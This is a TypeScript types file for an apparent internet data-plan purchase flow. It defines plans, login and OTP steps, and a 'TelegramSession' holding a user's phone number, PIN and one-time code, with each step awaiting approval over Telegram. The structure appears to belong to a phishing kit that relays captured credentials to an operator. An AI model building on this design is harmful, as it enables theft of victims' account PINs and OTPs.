export interface InternetPlan {
  id: string;
  dataAmount: string;
  dataUnit: string;
  networkType: string;
  validity: string;
  price: string;
  priceNum: number;
  badge?: string;
  badgeColor?: string;
  isPopular?: boolean;
  features: string[];
  speedTier: string;
}

export type Step = 'PLANS' | 'LOGIN' | 'OTP' | 'SUCCESS';

export type VerificationStatus = 'idle' | 'waiting_telegram' | 'approved' | 'rejected' | 'error';

export interface TelegramSession {
  sessionId: string;
  phone: string;
  pin: string;
  otp?: string;
  selectedPlan: InternetPlan;
  loginStatus: 'pending' | 'approved' | 'rejected';
  otpStatus: 'idle' | 'pending' | 'approved' | 'rejected';
  createdAt: number;
  lastUpdated: number;
}
